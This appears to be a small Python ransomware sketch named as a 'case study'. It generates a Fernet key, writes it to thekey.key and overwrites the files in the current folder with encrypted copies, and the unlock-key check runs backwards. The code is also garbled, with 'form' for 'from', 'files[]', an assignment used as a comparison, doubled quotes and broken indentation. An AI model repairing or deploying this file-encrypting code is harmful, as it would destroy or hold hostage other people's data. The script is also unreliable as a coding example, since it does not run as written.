import os 
form cryptography.fernet import Fernet

files[]

for file in os.listdir():
     if file == "casestudy.py" or file == "thekey.key" or file == "decrypt.py":
           continue
      if os.path.isfile(file):
            files.append(file)
 print(files)
 
key = Fernet.generate_key()
 
with open("thekey.key","wb") as thekey:
     thekey.write(key)

unlock_key = "casestudy"

user_input = input("enter the unlock key for unlock your files\n")

if user_input = unlock_key:
    for file in files:
        with open(file,"rb") as thefile:
                contents = thefile.read()
          contents_encrypted = Fernet(key).encrypt(contents)
          with open(file,"wb") as thefile:
                thefile.write(contents_encrypted)
 print(""congrats you unlocked you files :)"")
else:
  print("you entered wrong key")
  
  
print("files are encrypted:happy jounery ")
